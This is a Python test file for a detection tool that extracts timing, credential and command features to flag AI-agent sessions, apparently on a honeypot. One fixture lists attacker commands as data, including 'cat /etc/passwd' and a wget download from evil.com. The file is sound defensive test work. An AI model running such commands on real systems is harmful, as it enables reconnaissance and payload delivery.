"""Tests for behavioral feature extraction."""

import numpy as np
import pytest

from src.features.behavioral import AI_DETECTION_FEATURES, extract_features


def _make_session(inter_ms, commands=None, creds=None):
    return {
        "session_id": "test-001",
        "category": "AI_AGENT",
        "session_metadata": {
            "duration_seconds": sum(inter_ms) / 1000.0 if inter_ms else 0,
            "attempts_in_session": len(inter_ms) + 1,
            "inter_attempt_ms": inter_ms,
            "commands_executed": commands or [],
            "credentials_tried": creds or [],
            "successes": [False] * (len(creds) if creds else 0),
        },
    }


def test_feature_extraction_produces_all_features():
    session = _make_session([2000, 2100, 1900, 2050])
    features = extract_features(session)
    for f in AI_DETECTION_FEATURES:
        assert f in features, f"Missing feature: {f}"
        assert isinstance(features[f], (int, float)), f"Feature {f} is not numeric: {type(features[f])}"


def test_no_nan_in_features():
    session = _make_session([])
    features = extract_features(session)
    for f in AI_DETECTION_FEATURES:
        assert not np.isnan(features[f]), f"NaN in feature: {f}"


def test_regular_timing_has_low_cv():
    # Regular intervals (like LLM inference) should have low coefficient of variation
    session = _make_session([2000, 2000, 2000, 2000, 2000])
    features = extract_features(session)
    assert features["inter_attempt_cv"] < 0.1, f"CV too high for regular timing: {features['inter_attempt_cv']}"


def test_irregular_timing_has_high_cv():
    # Irregular intervals (like human typing) should have high CV
    session = _make_session([100, 5000, 200, 8000, 50])
    features = extract_features(session)
    assert features["inter_attempt_cv"] > 0.5, f"CV too low for irregular timing: {features['inter_attempt_cv']}"


def test_credential_diversity():
    creds = [["admin", "pass1"], ["admin", "pass2"], ["root", "pass3"]]
    session = _make_session([1000, 1000], creds=creds)
    features = extract_features(session)
    assert features["unique_usernames"] == 2
    assert features["unique_passwords"] == 3
    assert features["credential_diversity"] == 1.0  # all unique


def test_command_features():
    commands = ["uname -a", "cat /etc/passwd", "ls -la", "wget http://evil.com/payload"]
    session = _make_session([2000, 2000, 2000], commands=commands)
    features = extract_features(session)
    assert features["command_count"] == 4
    assert features["recon_command_ratio"] == 0.75  # 3 of 4 are recon
    assert features["download_attempt"] == 1.0
